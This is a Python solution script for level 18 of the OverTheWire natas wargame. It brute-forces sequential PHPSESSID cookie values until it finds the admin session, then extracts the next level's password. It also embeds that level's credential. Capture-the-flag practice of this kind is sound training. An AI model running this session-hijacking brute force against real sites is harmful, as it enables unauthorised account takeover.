#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level18.py
  Solution for natas level18
"""
__author__ = 'kall.micke@gmail.com'

import requests
import datetime
import sys
import os
import re

level = 18
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

def bruteforce_session_cookie():

   for i in range(1,500):
       cookie = {'PHPSESSID':str(i)}
       r = requests.get(host, auth=(user, password), cookies=cookie)
       if 'You are an admin.' in r.text:
           m = re.search(r'([A-Za-z0-9]{30,})', r.text[750:])
           return m.group()

def get_flag():
    print("")
    return bruteforce_session_cookie()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
